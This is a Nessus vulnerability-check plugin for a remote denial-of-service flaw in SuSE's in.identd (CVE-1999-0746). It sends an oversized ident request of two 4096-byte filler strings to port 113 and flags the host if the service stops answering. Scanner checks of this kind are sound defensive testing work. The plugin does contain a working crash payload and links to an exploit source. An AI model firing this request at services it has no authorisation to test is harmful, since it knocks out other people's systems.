#
# (C) Tenable Network Security, Inc.
#

##############
# References:
##############
#
# Date: Sun, 15 Sep 2002 04:04:09 +0000
# From: "Lance Fitz-Herbert" <fitzies@HOTMAIL.COM>
# Subject: Trillian .74 and below, ident flaw.
# To: NTBUGTRAQ@LISTSERV.NTBUGTRAQ.COM
#

include( 'compat.inc' );

if(description)
{
  script_id(10560);
  script_version ("$Revision: 1.14 $");
  script_cve_id("CVE-1999-0746");
  script_bugtraq_id(587);
  script_xref(name:"OSVDB", value:"459");

  script_name(english:"SuSE Linux in.identd Request Saturation DoS");
  script_summary(english:"crashes the remote identd");

  script_set_attribute(
    attribute:'synopsis',
    value:'The remote service is vulnerable to denial of service.'
  );

  script_set_attribute(
    attribute:'description',
    value:'Ident is a protocol which gives to the remote server
the name of the user who initiated a given connection.
It\'s mainly used by IRC, SMTP and POP servers to obtain
the login name of the person who is using their services.

There is a flaw in the remote identd daemon which allows anyone
to crash this service remotely.'
  );

  script_set_attribute(
    attribute:'solution',
    value:'Disable this service if you do not use it, or upgrade.'
  );

  script_set_attribute(
    attribute:'see_also',
    value:'http://downloads.securityfocus.com/vulnerabilities/exploits/susekill.c'
  );

  script_set_attribute(
    attribute:'cvss_vector',
    value:'CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P'
  );

  script_end_attributes();

 script_category(ACT_DENIAL);
 script_copyright(english:"This script is Copyright (C) 2000-2009 Tenable Network Security, Inc.");
 script_family(english:"Denial of Service");
 script_dependencie("find_service1.nasl");
 script_require_ports("Services/auth", 113);
 exit(0);
}

#
# The script code starts here
#

include("global_settings.inc");

if (report_paranoia < 2) exit(0);

port = get_kb_item("Services/auth");
if(!port) port = 113;
if(!get_port_state(port))exit(0);


soc = open_sock_tcp(port);
if(soc)
{
 req = string(crap(4096), ",", crap(4096), "\r\n");
 send(socket:soc, data:req);
 sleep(2);
 close(soc);

 soc = open_sock_tcp(port);
 if(!soc)security_warning(port);
}
